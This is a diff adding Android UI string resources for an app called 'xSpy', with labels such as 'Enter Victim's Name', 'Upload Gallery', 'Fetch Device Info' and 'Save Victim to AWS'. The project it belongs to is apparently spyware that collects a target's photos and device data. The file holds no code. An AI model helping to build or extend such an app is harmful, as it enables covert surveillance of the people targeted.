@@ -1,0 +1,8 @@
+<resources>
+    <string name="app_name">xSpy</string>
+    <string name="get_permission">GET PERMISSION</string>
+    <string name="upload_gallery">Upload Gallery</string>
+    <string name="fetch_device_info">Fetch Device Info</string>
+    <string name="enter_victim_s_name">Enter Victim\'s Name</string>
+    <string name="save_victim_to_aws">Save Victim to AWS</string>
+</resources>
